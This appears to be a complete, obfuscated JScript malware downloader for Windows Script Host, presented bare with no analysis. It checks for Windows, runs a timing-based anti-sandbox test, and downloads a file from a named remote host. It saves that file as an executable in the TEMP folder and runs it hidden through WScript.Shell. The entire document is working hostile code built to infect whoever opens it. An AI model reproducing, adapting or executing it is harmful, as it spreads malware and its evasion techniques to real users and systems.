var C = false;
var W0 = "Create"+"Object";
var E0 = function K() {return WScript[W0]("WScript"+".Shell");}(), D = 11;
var HV = "MSXML2"+".XMLHTTP";
var LH = 2;
var E = LH - 2;
function CC(M){E0["Run"](M, E, E);};
function PJ(){return HV + "";};
function Z(GK, IA0){E = E * 1; return GK - IA0;};
function GR(){return W0;};
/*@cc_on
  @if (@_win32 || @_win64)
    C = true;
  @end
@*/
if (C)
{
var F = "";
function UF(){return 22;};
var T = 0; var U = 0;
function EM()
{
var XI = new this["Date"]();
var V = XI["getUTCMilliseconds"]();
WScript["Sleep"](UF());
var XI = new this["Date"]();
var Q = XI["getUTCMilliseconds"]();
WScript["Sleep"](UF());
var XI = new this["Date"]();
var N0 = XI["getUTCMilliseconds"]();
var T = "H";
T = Z(Q, V);
var U = "N";
U = Z(N0, Q);
F = "open";
return Z(T, U);
}
var H0 = false;
var QM = false;
for (var EU = E; EU < UF() * 1; EU++){if (EM() != E){
H0 = true; 
U = "31" + 11 * T + U; 
QM = true; 
break;
}}
function MZ() {return ((H0 == true) && (H0 == QM)) ? 1 : E;};
if (H0 && MZ() && QM){
function XV() {return E0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "MRWWQ81h.ex" + "e";};
 IA = PJ();
 SM = WScript[W0](IA);
 var EX = 1;
do { 
	for (;EX;){
	try {
		if (EX == 1)
		{
			SM[F]("GET", "http://vidamparty.hu/as0ldr", false);
			SM["send"]();
			A = "Sleep";
			EX = 2;
		}
		WScript[A](UF() + 120); 
		if (SM["readystate"] < 2 * 2) continue;
		EX = E;
		function DO(W) {var LF = (1, 2, 3, 4, 5, W); return LF;};
		U0 = WScript[GR()]("ADODB.Stream");
		IA = U0;
		IA[F]();
		IA["type"] = DO(1);
		IA["write"](SM["ResponseBody"]);
		U0["position"] = DO(E);
		IA["Save" + "ToFile"](XV(), 2);
		U0["cl"+"ose"]();
		OX = XV();
		CC(OX);
	} catch(A0){};};
}while (EX);
}
}

